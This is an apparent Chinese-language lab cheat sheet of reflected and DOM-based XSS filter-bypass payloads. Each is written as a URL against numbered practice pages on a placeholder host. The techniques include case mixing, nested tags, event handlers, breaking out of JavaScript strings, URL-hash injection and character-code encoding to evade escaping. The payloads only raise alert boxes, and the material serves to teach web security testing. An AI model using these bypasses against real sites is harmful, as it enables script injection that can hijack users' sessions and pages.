## 1、大小写绕过

```http
http://target_sys.com/xss/xss04.php?name=<Script>alert(1);</Script>
```

## 2、属性多余

```http
http://target_sys.com/xss/xss05.php?name=<script<script>>alert(1);</sc</script>ript>
```

## 3、转换标签

```http
http://target_sys.com/xss/xss06.php?name=moon<img src=a onerror=alert(1)>
```

## 4、禁用alert

```http
http://target_sys.com/xss/xss07.php?name=<img src="1" onerror="confirm('xss')">
```

## 5、js输出

```http
http://target_sys.com/xss/xss08.php?name=moon";alert($a)//
```

## 6、js过滤输出

过滤单引号

```http
http://target_sys.com/xss/xss09.php?name=moon';alert($a);//
```

## 7、dom输出

```http
http://target_sys.com/xss/xss10.php?name=moon#<script>alert(/xss/);</script>
```

hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。

substring 从#开始截取后面的部分

## 8、urlxss

```http
http://target_sys.com/xss/xss11.php/" onsubmit="alert('1')
```

执行，再提交

$_SERVER['PHP_SELF'] 

## 9、过滤特殊字符

php开启gpc之后 

单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线

```http
http://target_sys.com/xss/xss12.php?name=<script>alert(1);</script>
http://target_sys.com/xss/xss12.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>
```

## 10、过滤大小号

```http
http://target_sys.com/xss/xss13.php?name=moon' onmouseover='javascript:alert(1)
```